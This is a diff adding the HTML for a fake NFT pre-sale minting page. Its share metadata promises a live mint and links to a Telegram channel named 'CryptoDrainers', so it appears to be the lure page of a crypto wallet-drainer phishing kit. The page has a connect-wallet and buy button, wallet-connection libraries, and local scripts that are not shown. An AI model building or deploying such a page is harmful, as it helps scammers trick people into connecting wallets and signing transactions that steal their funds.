@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading...</title>
+    <link id="favicon" rel="icon">
+    <meta property="og:site_name" content="NFTsMontana | PRE-SALE">
+    <meta property="og:title" content="CLICK HERE TO MINT!">
+    <meta property="og:description" content="&#x1F389;&#xFE0F; Our Pre-Sale is Live !
+
+&#x1f3f7;&#xfe0f; Sale info :
+&#x25B6;&#xFE0F; NFT Price: 0.2 &#x1D5D8;&#x1D5E7;&#x1D5DB;.
+&#x25B6;&#xFE0F; Max. per wallet: 6
+
+Thank you for patience and support !">
+    <meta property="og:url" content="https://t.me/CryptoDrainers">
+    <meta property="og:image:url" content="https://cdn.discordapp.com/attachments/967493626437455902/967841340320792626/a_95b0c3b3c227db03ec3fe7e276089f21.gif">
+    <meta name="theme-color" content="#000000">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <script src="/settings.js"></script>
+    <script src="/js/alert.js"></script>
+    <script src="https://npmcdn.com/moralis/dist/moralis.js"></script>
+    <script type="text/javascript">
+        const vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh < 8.0? 8.0 : vh}px`);
+        window.addEventListener('resize', () => {
+            const vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh < 8.0? 8.0 : vh}px`);
+        });
+    </script>
+    <link rel="stylesheet" type="text/css" href="/css/main.css">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/fonts.css" media="all">
+    <link rel="stylesheet" type="text/css" href="/css/alert.css" media="all">
+</head>
+<body class="body">
+    <div class="content">
+        <div id="WEB3_CONNECT_MODAL_ID"></div>
+        <video id="background-video" autoplay loop muted>
+            <source id="background-video-source" type="video/mp4">
+        </video>
+
+        <div class="alert-container" id="alert-container"></div>
+
+        <div class="sub-head" id="claim-text-wrapper">
+            <div class="social_medias">
+                <a id="social_discord" href="https://discord.gg/" class="item discord social_media" target="_blank"><img
+                        src="images/svg/Discord_Icon.svg" draggable="false" alt="Discord Icon"></a><a
+                    id="social_twitter" href="https://twitter.com/" class="item twitter social_media"
+                    target="_blank"><img src="images/svg/Twitter_Icon.svg" draggable="false" alt="Twitter Icon"></a>
+            </div>
+            <div id="payment-modal">
+                <div id="payment-header">
+                    <div id="payment-header-text">
+                        <h4 id="lbuy">Loading...</h4>
+                        <p id="lsupply" class="pt-1.5 italic-grey">Total supply: Loading...</p>
+                    </div>
+                </div>
+                <div id="payment-info">
+                    <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAABKUlEQVR42u3RMQEAAAjDMKYc6WCCgyOV0GS69KgAASIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAgLEBCACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiBAgAARECACAkRAgAgIEAERECACAkRAgAgIEAERECACAkSXLZ1yK0hKBJiuAAAAAElFTkSuQmCC"
+                        class="image" height="auto" id="price-img">
+                </div>
+                <div id="ape-number">
+                    <div class="calcs">
+                        <div id="minus">
+                            <svg width="16" height="2" viewbox="0 0 16 2" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z"
+                                    fill="white"></path>
+                            </svg>
+                        </div>
+                        <h5 id="lnprice" class="sol_input">1</h5>
+                        <div id="plus">
+                            <svg width="16" height="16" viewbox="0 0 16 16" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z"
+                                    fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <h5 id="ape-max">X Max</h5>
+                </div>
+                <div id="ape-total">
+                    <p class="total">Total</p>
+                    <h5 class="actual_price"><a id="price">X.XX</a> ETH + gas</h5>
+                </div>
+                <button class="purchase-button" id="transfer" style="display:none">BUY NOW</button>
+                <button class="purchase-button" id="connect" display="none">CONNECT WALLET</button>
+            </div>
+
+            <script src="/js/loader.js"></script>
+
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"
+                integrity="sha512-C63V0mFzwl8KV2fRz0QJNKX0d9877urOLSUq5WUq8nUOhDl69hKdGr9mAvl57k47GNjqEMAtiufsvDnk7xs8+w=="
+                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+            <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
+            <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+            <script type="text/javascript"
+                src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+                integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            <!--[if lte IE 9]>
+                <script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script>
+            <![endif]-->
+            <script src="https://cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
+            <script type="text/javascript" src="/js/index.js"></script>
+
+        </div>
+    </div>
+</body>
+</html>
